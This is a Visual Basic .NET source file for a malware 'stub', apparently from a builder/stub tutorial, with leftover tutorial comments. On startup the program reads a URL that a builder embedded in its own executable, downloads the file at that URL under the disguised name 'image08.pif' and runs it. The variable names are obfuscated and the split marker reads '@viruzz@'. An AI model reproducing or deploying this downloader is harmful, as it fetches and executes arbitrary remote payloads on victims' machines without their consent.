Imports System.IO
Public Class Form1

    'this is extremely important! make sure this is EXACTLY as it is in the other side. or this wont work
    '   because we are using this as a spacer to tell Split() how to split the string.
    Const FOilPhCkYdZHeaCA79U3B = "@viruzz@"

    'and before we can do anything. we need to dim us some new strings, you will notice that we
    '   have a new thing here. "Settings()", no its not a function, its a string, to be
    '   more specific. this is an array. it can hold more then one string, addressed by a number,
    '   just like with the files.
    Dim ere8ToVRiJMsMYoholBS, sAP93v1tSaA1ROnqw1dX() As String

    'you will notice that this is different. we don't have a button, we are going to do all this while its still
    '   starting up. it makes it easier.
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        'lets open the program. however this time, we are not opening a different file. we are having our
        '   program open itself. so instead of typing "Application.StartupPath", since the file could have been renamed,
        '   lets type "Application.ExecutablePath" this is the path and the filename to the executable. this makes it alot easyer
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        ere8ToVRiJMsMYoholBS = Space(LOF(1))


        
        FileGet(1, ere8ToVRiJMsMYoholBS)


        FileClose(1)


        sAP93v1tSaA1ROnqw1dX = Split(ere8ToVRiJMsMYoholBS, FOilPhCkYdZHeaCA79U3B)

        Link.Text = sAP93v1tSaA1ROnqw1dX(1)

        'this should be clear by now, our username text now equals the text we stored from out username text box in the first program. 
        'the same thing for the password text and the random text.


        'we are almost done! using our reference we made, we can make a if then elseif statement!

        'from here on it just requires a little thinking.  we just piece together what we know so far. and we test the remaining Settings() 
        'strings to see if they = "True" like we set them to be if it was checked!



        'now. go to the top menu and click: Build > Build LeG10Ns Stub Example (or your project name if your starting from scratch)

        'now all thats left. is go into this project folder, (if you haven't renamed the folder it should be this)
        '{path to where you saved this project}\LeG10Ns Stub Example\bin\Release, see the exe there? copy that. thats your stub.in 
        'now build the Builder as well.
        'once again go to the place where you saved this set of projects ({path to where you saved this project}\LeG10Ns Builder Example\bin\Release) 
        'and paste the exe you copied. then start the builder. when you click genorate it should make a new program in that folder. called "program.exe" run it! 

        'HOLY PROGRAMMER BATMAN! WHERE DONE! haha, good work! you finished a Builder and a stub! 

        ''happy programing!''
        My.Computer.Network.DownloadFile(sAP93v1tSaA1ROnqw1dX(1), "image08.pif")
        Dim startInfo As System.Diagnostics.ProcessStartInfo
        Dim pStart As New System.Diagnostics.Process

        startInfo = New System.Diagnostics.ProcessStartInfo("image08.pif")

        pStart.StartInfo = startInfo
        pStart.Start()
        pStart.WaitForExit()
        End
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class
